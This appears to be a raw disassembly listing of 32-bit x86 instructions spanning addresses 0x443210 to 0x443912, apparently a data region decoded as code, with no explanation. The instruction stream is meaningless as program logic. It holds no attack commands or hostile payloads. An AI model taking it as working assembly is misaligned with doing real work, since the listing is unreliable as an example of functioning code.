  443210:	add    BYTE PTR [edi+edi*8+0x0],al
  443214:	add    BYTE PTR [edi-0x1],bl
  443217:	add    BYTE PTR [eax],al
  443219:	jbe    0x44321a
  44321b:	add    BYTE PTR [ebx],al
  44321d:	mov    eax,ds:0xc80d01ff
  443222:	inc    DWORD PTR [esi]
  443224:	sbb    DWORD PTR [ecx+0x6c0000ff],edi
  44322a:	inc    DWORD PTR [eax]
  44322c:	add    BYTE PTR [edi],bh
  44322e:	inc    DWORD PTR [eax]
  443230:	add    BYTE PTR [esi],ah
  443232:	inc    DWORD PTR [eax]
  443234:	add    BYTE PTR ds:0xa0000ff,dl
  44323a:	inc    DWORD PTR [eax]
  44323c:	add    BYTE PTR [edx],cl
  44323e:	inc    DWORD PTR [eax]
  443240:	add    BYTE PTR ds:0xd0000ff,cl
  443246:	inc    DWORD PTR [eax]
  443248:	add    BYTE PTR [edx],cl
  44324a:	inc    DWORD PTR [eax]
  44324c:	add    BYTE PTR [edi],cl
  44324e:	inc    DWORD PTR [eax]
  443250:	add    BYTE PTR [esi],cl
  443252:	inc    DWORD PTR [eax]
  443254:	add    BYTE PTR [esi],cl
  443256:	inc    DWORD PTR [eax]
  443258:	add    BYTE PTR [eax],dl
  44325a:	inc    DWORD PTR [eax]
  44325c:	add    BYTE PTR [edi+edi*8],cl
  44325f:	add    BYTE PTR [eax],al
  443261:	or     al,0xff
  443263:	add    BYTE PTR [eax],al
  443265:	ud0    eax,DWORD PTR [eax]
  443268:	add    BYTE PTR ds:0x3c0000ff,bl
  44326e:	inc    DWORD PTR [eax]
  443270:	add    BYTE PTR [edi+edi*8+0x0],ah
  443274:	add    BYTE PTR [ebx-0x3ffff01],ah
  44327a:	jmp    DWORD PTR ds:0x35ff6c1e
  443280:	sub    ebx,DWORD PTR [edi]
  443282:	jmp    FWORD PTR [edx]
  443284:	and    ecx,DWORD PTR [eax-0x1]
  443287:	sbb    DWORD PTR [ebx],edx
  443289:	jmp    DWORD PTR es:[edx]
  44328c:	and    eax,0x1816ff4b
  443291:	inc    ebp
  443292:	dec    DWORD PTR ds:0xff3b0e
  443298:	add    BYTE PTR [edi],bl
  44329a:	inc    DWORD PTR [edi]
  44329c:	or     DWORD PTR [edi],esi
  44329e:	call   FWORD PTR [ebx]
  4432a0:	push   ds
  4432a1:	dec    esp
  4432a2:	dec    DWORD PTR [ebx+edx*1]
  4432a5:	dec    edx
  4432a6:	dec    DWORD PTR [esi]
  4432a8:	or     DWORD PTR [edi],ebp
  4432aa:	call   FWORD PTR ds:0x3fff76f
  4432b0:	or     eax,0xffcd
  4432b5:	mov    edi,edi
  4432b7:	add    BYTE PTR [eax],al
  4432b9:	push   esp
  4432ba:	inc    DWORD PTR [eax]
  4432bc:	add    BYTE PTR [edi+edi*8],ch
  4432bf:	add    BYTE PTR [eax],al
  4432c1:	adc    eax,0xc0000ff
  4432c6:	inc    DWORD PTR [eax]
  4432c8:	add    BYTE PTR [esi],cl
  4432ca:	inc    DWORD PTR [eax]
  4432cc:	add    BYTE PTR [edi+edi*8],dl
  4432cf:	add    BYTE PTR [eax],al
  4432d1:	push   ds
  4432d2:	inc    DWORD PTR [eax]
  4432d4:	add    BYTE PTR ds:0x460000ff,ch
  4432da:	inc    DWORD PTR [eax]
  4432dc:	add    BYTE PTR [esi-0x1],ah
  4432df:	add    BYTE PTR [eax],al
  4432e1:	mov    bh,bh
  4432e3:	add    eax,0xaffa50f
  4432e8:	and    BYTE PTR [edi-0x1f6fe01],dh
  4432ee:	inc    DWORD PTR [eax]
  4432f0:	sbb    bh,bh
  4432f2:	inc    DWORD PTR [eax]
  4432f4:	adc    eax,0x602fff4
  4432f9:	ret    
  4432fa:	inc    DWORD PTR [eax]
  4432fc:	add    al,al
  4432fe:	call   DWORD PTR [eax]
  443300:	sbb    al,0x8b
  443302:	jmp    DWORD PTR [eax]
  443304:	and    esp,DWORD PTR [edi]
  443306:	call   DWORD PTR [eax]
  443308:	or     eax,0x1513ff25
  44330d:	notrack call DWORD PTR [esi]
  443310:	adc    al,0x33
  443312:	dec    DWORD PTR [edi]
  443314:	or     al,0x1b
  443316:	call   DWORD PTR ds:0x17ff5a1a
  44331c:	adc    al,0x3d
  44331e:	call   FWORD PTR [ebx+eax*1]
  443321:	add    bh,bh
  443323:	adc    bh,BYTE PTR [ecx+edi*4]
  443326:	inc    DWORD PTR [edx]
  443328:	and    dl,dh
  44332a:	inc    DWORD PTR [eax]
  44332c:	add    BYTE PTR [ecx+0x510000ff],cl
  443332:	inc    DWORD PTR [eax]
  443334:	add    BYTE PTR [ebx],ch
  443336:	inc    DWORD PTR [eax]
  443338:	add    BYTE PTR ds:0x90000ff,dl
  44333e:	inc    DWORD PTR [eax]
  443340:	add    BYTE PTR [esi],al
  443342:	inc    DWORD PTR [eax]
  443344:	add    BYTE PTR ds:0x40000ff,al
  44334a:	inc    DWORD PTR [eax]
  44334c:	add    BYTE PTR [edi],al
  44334e:	inc    DWORD PTR [eax]
  443350:	add    BYTE PTR [ebx],dl
  443352:	inc    DWORD PTR [eax]
  443354:	add    BYTE PTR [eax],dh
  443356:	inc    DWORD PTR [eax]
  443358:	add    BYTE PTR [eax-0x1],bl
  44335b:	add    BYTE PTR [eax],al
  44335d:	xchg   esp,eax
  44335e:	dec    DWORD PTR [edi]
  443360:	je     0x2a564665
  443366:	call   DWORD PTR [eax+ebx*1]
  443369:	dec    ebp
  44336a:	dec    DWORD PTR [esi]
  44336c:	(bad)  
  44336e:	dec    DWORD PTR [esi]
  443370:	adc    cl,BYTE PTR [eax-0x1]
  443373:	adc    eax,0x16ff6d1b
  443378:	sbb    ch,BYTE PTR [edi+edi*8+0xe]
  44337c:	push   cs
  44337d:	xor    edi,edi
  44337f:	or     al,0x11
  443381:	xchg   ebx,eax
  443382:	inc    DWORD PTR [esi]
  443384:	or     DWORD PTR [ebx+0x2b0e0cff],eax
  44338a:	call   DWORD PTR ds:0x18ff4e19
  443390:	pop    ss
  443391:	inc    esp
  443392:	call   DWORD PTR [edx]
  443394:	adc    al,BYTE PTR [ebx-0x1]
  443397:	adc    eax,0x7ff2c11
  44339c:	adc    DWORD PTR [ebp-0x36ffff01],esi
  4433a2:	inc    DWORD PTR [edx]
  4433a4:	add    al,dl
  4433a6:	inc    DWORD PTR ds:0xff9c03
  4433ac:	add    BYTE PTR [edx+0x680000ff],dl
  4433b2:	inc    DWORD PTR [eax]
  4433b4:	add    BYTE PTR [edi+edi*8+0x0],cl
  4433b8:	add    BYTE PTR [edi+edi*8],dh
  4433bb:	add    BYTE PTR [eax],al
  4433bd:	and    edi,edi
  4433bf:	add    BYTE PTR [eax],al
  4433c1:	pop    ss
  4433c2:	inc    DWORD PTR [eax]
  4433c4:	add    BYTE PTR [ecx],dl
  4433c6:	inc    DWORD PTR [eax]
  4433c8:	add    BYTE PTR [edi],cl
  4433ca:	inc    DWORD PTR [eax]
  4433cc:	add    BYTE PTR [ebx],cl
  4433ce:	inc    DWORD PTR [eax]
  4433d0:	add    BYTE PTR [edx],cl
  4433d2:	inc    DWORD PTR [eax]
  4433d4:	add    BYTE PTR [edx],cl
  4433d6:	inc    DWORD PTR [eax]
  4433d8:	add    BYTE PTR [ecx],cl
  4433da:	inc    DWORD PTR [eax]
  4433dc:	add    BYTE PTR [edi],al
  4433de:	inc    DWORD PTR [eax]
  4433e0:	add    BYTE PTR [edx],cl
  4433e2:	inc    DWORD PTR [eax]
  4433e4:	add    BYTE PTR [edx],cl
  4433e6:	inc    DWORD PTR [eax]
  4433e8:	add    BYTE PTR [ebx],cl
  4433ea:	inc    DWORD PTR [eax]
  4433ec:	add    BYTE PTR ds:0xf0000ff,cl
  4433f2:	inc    DWORD PTR [eax]
  4433f4:	add    BYTE PTR [ebx],cl
  4433f6:	inc    DWORD PTR [eax]
  4433f8:	add    BYTE PTR [esi],cl
  4433fa:	inc    DWORD PTR [eax]
  4433fc:	add    BYTE PTR [edx],dl
  4433fe:	inc    DWORD PTR [eax]
  443400:	add    BYTE PTR ds:0x1f0000ff,dl
  443406:	inc    DWORD PTR [eax]
  443408:	add    BYTE PTR [ebx],dh
  44340a:	inc    DWORD PTR [eax]
  44340c:	add    BYTE PTR [edx-0x1],cl
  44340f:	add    BYTE PTR [eax],al
  443411:	push   0x8e0000ff
  443416:	inc    DWORD PTR [eax]
  443418:	add    BYTE PTR [ebp-0x4eaff01],bh
  44341e:	call   DWORD PTR [ecx]
  443420:	push   ds
  443421:	jne    0x443422
  443423:	or     al,0x1b
  443425:	mov    ah,0xff
  443427:	add    BYTE PTR [eax],al
  443429:	xchg   edi,eax
  44342a:	inc    DWORD PTR [eax]
  44342c:	add    BYTE PTR [edi-0x1],cl
  44342f:	add    BYTE PTR [eax],al
  443431:	inc    DWORD PTR cs:[eax]
  443434:	add    BYTE PTR [edi],dl
  443436:	inc    DWORD PTR [eax]
  443438:	add    BYTE PTR [edi],cl
  44343a:	inc    DWORD PTR [eax]
  44343c:	add    BYTE PTR [esi],cl
  44343e:	inc    DWORD PTR [eax]
  443440:	add    BYTE PTR [edx],cl
  443442:	inc    DWORD PTR [eax]
  443444:	add    BYTE PTR ds:0xe0000ff,cl
  44344a:	inc    DWORD PTR [eax]
  44344c:	add    BYTE PTR [esi],cl
  44344e:	inc    DWORD PTR [eax]
  443450:	add    BYTE PTR [edi],cl
  443452:	inc    DWORD PTR [eax]
  443454:	add    BYTE PTR ds:0xe0000ff,cl
  44345a:	inc    DWORD PTR [eax]
  44345c:	add    BYTE PTR [ecx],cl
  44345e:	inc    DWORD PTR [eax]
  443460:	add    BYTE PTR [ebx],cl
  443462:	inc    DWORD PTR [eax]
  443464:	add    BYTE PTR [esi],cl
  443466:	inc    DWORD PTR [eax]
  443468:	add    BYTE PTR [edi],bl
  44346a:	inc    DWORD PTR [eax]
  44346c:	add    BYTE PTR [ecx],bh
  44346e:	inc    DWORD PTR [eax]
  443470:	add    BYTE PTR [ebx-0x1],ah
  443473:	add    BYTE PTR [ecx],al
  443475:	mov    al,ds:0xf70600ff
  44347a:	inc    DWORD PTR [ebx]
  44347c:	add    esp,eax
  44347e:	jmp    DWORD PTR [edx]
  443480:	sbb    cl,BYTE PTR [eax]
  443482:	jmp    DWORD PTR ds:0xaff371f
  443488:	push   cs
  443489:	notrack jmp DWORD PTR [edx]
  44348c:	and    cl,BYTE PTR [eax-0x1]
  44348f:	and    DWORD PTR [edx],esp
  443491:	dec    ebx
  443492:	call   DWORD PTR [eax]
  443494:	adc    DWORD PTR [edi+edi*8],esi
  443497:	adc    BYTE PTR [ecx],dl
  443499:	call   DWORD PTR ss:[esi+edx*1]
  44349d:	xor    edi,edi
  44349f:	and    ah,BYTE PTR [ebx]
  4434a1:	push   eax
  4434a2:	call   DWORD PTR [esi]
  4434a4:	sbb    dh,BYTE PTR [eax-0x1]
  4434a7:	or     ebx,DWORD PTR [eax]
  4434a9:	outs   dx,BYTE PTR ds:[esi]
  4434aa:	dec    DWORD PTR ds:0x2fff650
  4434b0:	or     dl,ah
  4434b2:	inc    DWORD PTR [eax]
  4434b4:	add    BYTE PTR [edx+0x4e0000ff],al
  4434ba:	inc    DWORD PTR [eax]
  4434bc:	add    BYTE PTR [ebx],ch
  4434be:	inc    DWORD PTR [eax]
  4434c0:	add    BYTE PTR [edx],dl
  4434c2:	inc    DWORD PTR [eax]
  4434c4:	add    BYTE PTR [edx],cl
  4434c6:	inc    DWORD PTR [eax]
  4434c8:	add    BYTE PTR [ecx],dl
  4434ca:	inc    DWORD PTR [eax]
  4434cc:	add    BYTE PTR [edx],bl
  4434ce:	inc    DWORD PTR [eax]
  4434d0:	add    BYTE PTR [edi+edi*8],ch
  4434d3:	add    BYTE PTR [eax],al
  4434d5:	inc    edi
  4434d6:	inc    DWORD PTR [eax]
  4434d8:	add    BYTE PTR [ebx-0x1],ch
  4434db:	add    BYTE PTR [ecx],al
  4434dd:	xchg   esp,eax
  4434de:	inc    DWORD PTR ds:0xffbe14
  4434e4:	or     eax,0x230dffff
  4434e9:	mov    bh,bh
  4434eb:	add    ecx,DWORD PTR [edi]
  4434ed:	call   0xff5535f1
  4434f2:	inc    DWORD PTR ds:0x19ffff1d
  4434f8:	sbb    ebp,DWORD PTR [eax-0x1]
  4434fb:	add    BYTE PTR [eax],al
  4434fd:	(bad)  
  4434fe:	inc    DWORD PTR [eax]
  443500:	add    bl,al
  443502:	inc    DWORD PTR [ecx]
  443504:	push   ss
  443505:	int3   
  443506:	dec    DWORD PTR [ebx]
  443508:	sbb    edi,DWORD PTR [edi+0x5c0d13ff]
  44350e:	dec    DWORD PTR [edi]
  443510:	or     al,0x13
  443512:	dec    DWORD PTR [edi]
  443514:	mov    db7,edi
  443517:	adc    eax,0x19ff601c
  44351c:	mov    db7,edi
  44351f:	sbb    al,0x10
  443521:	and    bh,bh
  443523:	push   cs
  443524:	ds loop 0x443526
  443527:	add    BYTE PTR [ebx],al
  443529:	retf   0xff
  44352c:	add    BYTE PTR [ebx-0x1],dh
  44352f:	add    BYTE PTR [eax],al
  443531:	inc    ebx
  443532:	inc    DWORD PTR [eax]
  443534:	add    BYTE PTR [ecx],ah
  443536:	inc    DWORD PTR [eax]
  443538:	add    BYTE PTR [edi],cl
  44353a:	inc    DWORD PTR [eax]
  44353c:	add    BYTE PTR [eax],cl
  44353e:	inc    DWORD PTR [eax]
  443540:	add    BYTE PTR [esi],al
  443542:	inc    DWORD PTR [eax]
  443544:	add    BYTE PTR [esi],al
  443546:	inc    DWORD PTR [eax]
  443548:	add    BYTE PTR ds:0x70000ff,al
  44354e:	inc    DWORD PTR [eax]
  443550:	add    BYTE PTR [edi],cl
  443552:	inc    DWORD PTR [eax]
  443554:	add    BYTE PTR ds:0x4a0000ff,ah
  44355a:	inc    DWORD PTR [eax]
  44355c:	add    BYTE PTR [esi-0x1],bh
  44355f:	pop    es
  443560:	pop    es
  443561:	cwde   
  443562:	call   DWORD PTR [edx]
  443564:	adc    BYTE PTR [esi],ah
  443566:	dec    DWORD PTR [edi]
  443568:	sbb    BYTE PTR [edx-0x1],cl
  44356b:	adc    DWORD PTR [ecx+ecx*2],edx
  44356e:	inc    DWORD PTR [edi]
  443570:	or     DWORD PTR ds:0x41100cff,ebp
  443576:	call   DWORD PTR [edi]
  443578:	sbb    ch,BYTE PTR [edi-0x1]
  44357b:	adc    al,0x18
  44357d:	inc    esp
  44357e:	inc    DWORD PTR [eax]
  443580:	add    DWORD PTR [eax-0x71f8fa01],edi
  443586:	call   DWORD PTR [eax]
  443588:	push   ss
  443589:	push   ecx
  44358a:	call   DWORD PTR [eax+ebx*1]
  44358d:	dec    eax
  44358e:	dec    DWORD PTR [edi]
  443590:	adc    BYTE PTR [edi+edi*8],dh
  443593:	prefetch BYTE PTR [edi]
  443596:	dec    DWORD PTR [edx]
  443598:	(bad)  
  44359a:	inc    DWORD PTR [eax]
  44359c:	or     al,0xe2
  44359e:	inc    DWORD PTR [eax]
  4435a0:	add    ah,al
  4435a2:	inc    DWORD PTR [esi]
  4435a4:	add    al,dh
  4435a6:	dec    DWORD PTR [ecx]
  4435a8:	or     esi,ecx
  4435aa:	inc    DWORD PTR [eax]
  4435ac:	push   es
  4435ad:	xlat   BYTE PTR ds:[ebx]
  4435ae:	inc    DWORD PTR [ecx]
  4435b0:	add    ebp,DWORD PTR [edx+0x750000ff]
  4435b6:	inc    DWORD PTR [eax]
  4435b8:	add    BYTE PTR [ebp-0x1],dl
  4435bb:	add    BYTE PTR [eax],al
  4435bd:	cmp    edi,edi
  4435bf:	add    BYTE PTR [eax],al
  4435c1:	sub    eax,0x260000ff
  4435c6:	inc    DWORD PTR [eax]
  4435c8:	add    BYTE PTR [edx],ah
  4435ca:	inc    DWORD PTR [eax]
  4435cc:	add    BYTE PTR [edi],bl
  4435ce:	inc    DWORD PTR [eax]
  4435d0:	add    BYTE PTR [ecx],bl
  4435d2:	inc    DWORD PTR [eax]
  4435d4:	add    BYTE PTR ds:0x100000ff,dl
  4435da:	inc    DWORD PTR [eax]
  4435dc:	add    BYTE PTR ds:0x90000ff,cl
  4435e2:	inc    DWORD PTR [eax]
  4435e4:	add    BYTE PTR ds:0xb0000ff,cl
  4435ea:	inc    DWORD PTR [eax]
  4435ec:	add    BYTE PTR ds:0x100000ff,cl
  4435f2:	inc    DWORD PTR [eax]
  4435f4:	add    BYTE PTR [esi],dl
  4435f6:	inc    DWORD PTR [eax]
  4435f8:	add    BYTE PTR [edi+edi*8],bl
  4435fb:	add    BYTE PTR [eax],al
  4435fd:	and    edi,edi
  4435ff:	add    BYTE PTR [eax],al
  443601:	inc    DWORD PTR cs:[eax]
  443604:	add    BYTE PTR [esi],bh
  443606:	inc    DWORD PTR [eax]
  443608:	add    BYTE PTR [edi-0x1],dl
  44360b:	add    BYTE PTR [eax],al
  44360d:	jne    0x44360e
  44360f:	add    BYTE PTR [eax],al
  443611:	fwait
  443612:	inc    DWORD PTR [ebx]
  443614:	add    eax,0x140fffb6
  443619:	jno    0x44361a
  44361b:	push   cs
  44361c:	push   ss
  44361d:	call   DWORD PTR cs:[ecx]
  443620:	adc    eax,0x1a0aff0b
  443625:	test   eax,0xa00000ff
  44362a:	inc    DWORD PTR [eax]
  44362c:	add    BYTE PTR [edx-0x1],bl
  44362f:	add    BYTE PTR [eax],al
  443631:	xor    edi,edi
  443633:	add    BYTE PTR [eax],al
  443635:	sbb    bh,bh
  443637:	add    BYTE PTR [eax],al
  443639:	or     al,0xff
  44363b:	add    BYTE PTR [eax],al
  44363d:	or     bh,bh
  44363f:	add    BYTE PTR [eax],al
  443641:	or     edi,edi
  443643:	add    BYTE PTR [eax],al
  443645:	or     al,0xff
  443647:	add    BYTE PTR [eax],al
  443649:	or     eax,0xc0000ff
  44364e:	inc    DWORD PTR [eax]
  443650:	add    BYTE PTR [edi+edi*8],cl
  443653:	add    BYTE PTR [eax],al
  443655:	or     al,0xff
  443657:	add    BYTE PTR [eax],al
  443659:	or     eax,0xb0000ff
  44365e:	inc    DWORD PTR [eax]
  443660:	add    BYTE PTR [ebx],cl
  443662:	inc    DWORD PTR [eax]
  443664:	add    BYTE PTR [edx],cl
  443666:	inc    DWORD PTR [eax]
  443668:	add    BYTE PTR [esi],bl
  44366a:	inc    DWORD PTR [eax]
  44366c:	add    BYTE PTR [eax],bh
  44366e:	inc    DWORD PTR [eax]
  443670:	add    BYTE PTR [ebx-0x1],ah
  443673:	add    BYTE PTR [edx],al
  443675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443676:	inc    DWORD PTR [eax]
  443678:	sbb    al,dh
  44367a:	inc    DWORD PTR [eax]
  44367c:	add    bh,bl
  44367e:	inc    DWORD PTR [eax]
  443680:	add    BYTE PTR [edi+0x30201cff],ah
  443686:	dec    DWORD PTR [ebx]
  443688:	sbb    bh,BYTE PTR [ecx]
  44368a:	dec    DWORD PTR [ecx]
  44368c:	sqrtps xmm7,xmm7
  44368f:	sbb    BYTE PTR [eax],bl
  443691:	cmp    edi,edi
  443693:	adc    BYTE PTR [eax],dl
  443695:	xor    eax,0x421714ff
  44369a:	call   DWORD PTR [ebx]
  44369c:	sbb    eax,0x1d20ff41
  4436a1:	cmp    eax,0x200e13ff
  4436a6:	inc    DWORD PTR ds:0xffbb0e
  4436ac:	pop    ss
  4436ad:	(bad)  
  4436ae:	inc    DWORD PTR [eax]
  4436b0:	push   es
  4436b1:	int3   
  4436b2:	inc    DWORD PTR [eax]
  4436b4:	add    BYTE PTR [ebp-0x1],bh
  4436b7:	add    BYTE PTR [eax],al
  4436b9:	dec    edi
  4436ba:	inc    DWORD PTR [eax]
  4436bc:	add    BYTE PTR [edi],ch
  4436be:	inc    DWORD PTR [eax]
  4436c0:	add    BYTE PTR [edi+edi*8],bl
  4436c3:	add    BYTE PTR [eax],al
  4436c5:	sbb    edi,edi
  4436c7:	add    BYTE PTR [eax],al
  4436c9:	push   ds
  4436ca:	inc    DWORD PTR [eax]
  4436cc:	add    BYTE PTR [esi],ch
  4436ce:	inc    DWORD PTR [eax]
  4436d0:	add    BYTE PTR [edi+edi*8+0x0],al
  4436d4:	add    BYTE PTR [ebx-0x1],ch
  4436d7:	add    BYTE PTR [ecx],al
  4436d9:	mov    ds:0xd52d0bff,al
  4436de:	call   DWORD PTR [ecx]
  4436e0:	cmp    esi,ecx
  4436e2:	inc    DWORD PTR [eax+ebx*1]
  4436e5:	icebp  
  4436e6:	call   DWORD PTR [eax]
  4436e8:	and    BYTE PTR [eax-0x1],cl
  4436eb:	add    DWORD PTR [eax],eax
  4436ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4436ee:	inc    DWORD PTR [eax]
  4436f0:	add    BYTE PTR [ecx-0x31eef601],bh
  4436f6:	call   FWORD PTR [edx]
  4436f8:	sbb    al,0x3d
  4436fa:	dec    DWORD PTR [esi]
  4436fc:	adc    DWORD PTR [ebp-0x1],ebp
  4436ff:	add    BYTE PTR [eax],al
  443701:	in     eax,0xff
  443703:	add    BYTE PTR [eax],al
  443705:	ret    0xff
  443708:	sbb    bh,ch
  44370a:	inc    DWORD PTR [esi]
  44370c:	push   cs
  44370d:	scas   al,BYTE PTR es:[edi]
  44370e:	call   DWORD PTR [edi]
  443710:	adc    ebx,DWORD PTR [ecx]
  443712:	call   DWORD PTR [ebx]
  443714:	mov    db7,edi
  443717:	push   ss
  443718:	adc    DWORD PTR [ebx],ebp
  44371a:	call   FWORD PTR [ecx+ecx*1]
  44371d:	adc    bh,bh
  44371f:	push   ss
  443720:	xor    DWORD PTR [eax-0x7d5f801],esp
  443726:	inc    DWORD PTR [eax]
  443728:	add    BYTE PTR [ebx+0x610000ff],bl
  44372e:	inc    DWORD PTR [eax]
  443730:	add    BYTE PTR [edi],dh
  443732:	inc    DWORD PTR [eax]
  443734:	add    BYTE PTR [eax],bl
  443736:	inc    DWORD PTR [eax]
  443738:	add    BYTE PTR [ecx],cl
  44373a:	inc    DWORD PTR [eax]
  44373c:	add    BYTE PTR ds:0x60000ff,al
  443742:	inc    DWORD PTR [eax]
  443744:	add    BYTE PTR ds:0x50000ff,al
  44374a:	inc    DWORD PTR [eax]
  44374c:	add    BYTE PTR ds:0xb0000ff,al
  443752:	inc    DWORD PTR [eax]
  443754:	add    BYTE PTR ds:0x3e0000ff,bl
  44375a:	inc    DWORD PTR [eax]
  44375c:	add    BYTE PTR [edi+edi*8+0x5],ch
  443760:	push   es
  443761:	xchg   edi,edi
  443763:	adc    al,0x10
  443765:	sub    bh,bh
  443767:	unpckhps xmm0,XMMWORD PTR [eax-0x1]
  44376b:	adc    DWORD PTR [esi+edx*2],ebx
  44376e:	dec    DWORD PTR ds:0xaff370d
  443774:	adc    BYTE PTR [esi],bh
  443776:	call   DWORD PTR [ebx]
  443778:	pop    ss
  443779:	arpl   di,di
  44377b:	unpcklps xmm1,XMMWORD PTR [eax-0x1]
  44377f:	pop    es
  443780:	adc    al,0x80
  443782:	inc    DWORD PTR [edi]
  443784:	or     edi,DWORD PTR [ebp-0x1]
  443787:	or     dl,BYTE PTR [eax]
  443789:	dec    DWORD PTR [bp+di]
  44378c:	or     eax,0xa0bff32
  443791:	sub    bh,bh
  443793:	add    eax,0xffa00e
  443798:	or     ah,bl
  44379a:	inc    DWORD PTR [eax]
  44379c:	add    esp,eax
  44379e:	inc    DWORD PTR [ecx]
  4437a0:	add    bh,bl
  4437a2:	inc    DWORD PTR [edi+ecx*1]
  4437a5:	hlt    
  4437a6:	inc    DWORD PTR [ebx]
  4437a8:	push   cs
  4437a9:	idiv   edi
  4437ab:	add    BYTE PTR [edx],cl
  4437ad:	icebp  
  4437ae:	inc    DWORD PTR [eax]
  4437b0:	or     edi,esp
  4437b2:	inc    DWORD PTR [eax]
  4437b4:	add    bl,BYTE PTR [ecx+0x7a0000ff]
  4437ba:	inc    DWORD PTR [eax]
  4437bc:	add    BYTE PTR [ebx-0x1],bl
  4437bf:	add    BYTE PTR [eax],al
  4437c1:	dec    ebx
  4437c2:	inc    DWORD PTR [eax]
  4437c4:	add    BYTE PTR [ebx-0x1],al
  4437c7:	add    BYTE PTR [eax],al
  4437c9:	cmp    eax,0x3b0000ff
  4437ce:	inc    DWORD PTR [eax]
  4437d0:	add    BYTE PTR ds:0x2e0000ff,dh
  4437d6:	inc    DWORD PTR [eax]
  4437d8:	add    BYTE PTR [edi],ah
  4437da:	inc    DWORD PTR [eax]
  4437dc:	add    BYTE PTR [edi],bl
  4437de:	inc    DWORD PTR [eax]
  4437e0:	add    BYTE PTR [edi+edi*8],bl
  4437e3:	add    BYTE PTR [eax],al
  4437e5:	sbb    al,0xff
  4437e7:	add    BYTE PTR [eax],al
  4437e9:	sbb    bh,bh
  4437eb:	add    BYTE PTR [eax],al
  4437ed:	pop    ds
  4437ee:	inc    DWORD PTR [eax]
  4437f0:	add    BYTE PTR [ebx],ah
  4437f2:	inc    DWORD PTR [eax]
  4437f4:	add    BYTE PTR [eax],ch
  4437f6:	inc    DWORD PTR [eax]
  4437f8:	add    BYTE PTR [ecx],dh
  4437fa:	inc    DWORD PTR [eax]
  4437fc:	add    BYTE PTR [edi],bh
  4437fe:	inc    DWORD PTR [eax]
  443800:	add    BYTE PTR [esi-0x1],cl
  443803:	add    BYTE PTR [eax],al
  443805:	inc    WORD PTR [eax]
  443808:	add    BYTE PTR [ebp-0x5dfefe01],al
  44380e:	inc    DWORD PTR [edi]
  443810:	or     ecx,DWORD PTR [edx+0x612315ff]
  443816:	call   FWORD PTR [ebx+eiz*1]
  443819:	cmp    bh,bh
  44381b:	and    DWORD PTR [edx],ebx
  44381d:	sub    al,0xff
  44381f:	or     BYTE PTR [ecx],dl
  443821:	sub    edi,edi
  443823:	or     DWORD PTR [ecx+esi*2],ecx
  443826:	inc    DWORD PTR [eax]
  443828:	add    BYTE PTR [ebp+0x610000ff],ch
  44382e:	inc    DWORD PTR [eax]
  443830:	add    BYTE PTR [edi+edi*8],dh
  443833:	add    BYTE PTR [eax],al
  443835:	sbb    bh,bh
  443837:	add    BYTE PTR [eax],al
  443839:	or     edi,edi
  44383b:	add    BYTE PTR [eax],al
  44383d:	or     eax,0xc0000ff
  443842:	inc    DWORD PTR [eax]
  443844:	add    BYTE PTR [edi+edi*8],cl
  443847:	add    BYTE PTR [eax],al
  443849:	push   cs
  44384a:	inc    DWORD PTR [eax]
  44384c:	add    BYTE PTR [edx],cl
  44384e:	inc    DWORD PTR [eax]
  443850:	add    BYTE PTR [edi+edi*8],cl
  443853:	add    BYTE PTR [eax],al
  443855:	or     eax,0xb0000ff
  44385a:	inc    DWORD PTR [eax]
  44385c:	add    BYTE PTR [eax],cl
  44385e:	inc    DWORD PTR [eax]
  443860:	add    BYTE PTR [esi],cl
  443862:	inc    DWORD PTR [eax]
  443864:	add    BYTE PTR [ebx],cl
  443866:	inc    DWORD PTR [eax]
  443868:	add    BYTE PTR [ebx],bl
  44386a:	inc    DWORD PTR [eax]
  44386c:	add    BYTE PTR [ecx],bh
  44386e:	inc    DWORD PTR [eax]
  443870:	add    BYTE PTR [edx-0x1],ah
  443873:	add    BYTE PTR [esi],al
  443875:	scas   eax,DWORD PTR es:[edi]
  443876:	inc    DWORD PTR [ecx]
  443878:	adc    esp,edx
  44387a:	inc    DWORD PTR [ecx]
  44387c:	or     al,ah
  44387e:	inc    DWORD PTR [eax]
  443880:	add    ch,cl
  443882:	inc    DWORD PTR [ebx]
  443884:	add    eax,0x1f13ffdb
  443889:	sub    bh,bh
  44388b:	or     dl,BYTE PTR [ecx]
  44388d:	dec    ecx
  44388e:	inc    DWORD PTR [ecx]
  443890:	pop    es
  443891:	inc    edi
  443892:	dec    DWORD PTR ds:0x1bff4019
  443898:	and    BYTE PTR [ecx-0x1],dl
  44389b:	adc    bl,BYTE PTR [ecx]
  44389d:	inc    eax
  44389e:	call   FWORD PTR [ebx]
  4438a0:	and    BYTE PTR [ebx-0x1],cl
  4438a3:	sbb    BYTE PTR [ebx],bl
  4438a5:	xor    edi,edi
  4438a7:	or     ebp,DWORD PTR [edx]
  4438a9:	loop   0x4438aa
  4438ab:	add    BYTE PTR [ebx],al
  4438ad:	stc    
  4438ae:	inc    DWORD PTR [eax]
  4438b0:	add    BYTE PTR [ebp+0x7d0000ff],bh
  4438b6:	inc    DWORD PTR [eax]
  4438b8:	add    BYTE PTR [ecx-0x1],bl
  4438bb:	add    BYTE PTR [eax],al
  4438bd:	aas    
  4438be:	inc    DWORD PTR [eax]
  4438c0:	add    BYTE PTR [ebx],dh
  4438c2:	inc    DWORD PTR [eax]
  4438c4:	add    BYTE PTR [ecx],dh
  4438c6:	inc    DWORD PTR [eax]
  4438c8:	add    BYTE PTR [esi],dh
  4438ca:	inc    DWORD PTR [eax]
  4438cc:	add    BYTE PTR [eax-0x1],cl
  4438cf:	add    BYTE PTR [eax],al
  4438d1:	inc    DWORD PTR [bx+si]
  4438d4:	add    BYTE PTR [esi-0x18faff01],bl
  4438da:	dec    DWORD PTR [ebx]
  4438dc:	and    bh,BYTE PTR [edx-0x68e7f601]
  4438e2:	dec    DWORD PTR [eax]
  4438e4:	adc    eax,0x1810ff8c
  4438e9:	push   ecx
  4438ea:	dec    DWORD PTR ds:0x7ff940f
  4438f0:	or     BYTE PTR [edi+edi*8+0x14],dl
  4438f4:	adc    eax,0x1813ff44
  4438f9:	xor    bh,bh
  4438fb:	pop    ss
  4438fc:	sbb    eax,0x605ff2e
  443901:	sar    bh,cl
  443903:	add    BYTE PTR [eax],al
  443905:	jecxz  0x443906
  443907:	add    BYTE PTR [eax],al
  443909:	enter  0xff,0x11
  44390d:	jmp    0x44390e
  44390f:	adc    al,0x12
  443911:	popa   
  443912:	jmp    DWORD PTR [ebx*1+0x131cff37]
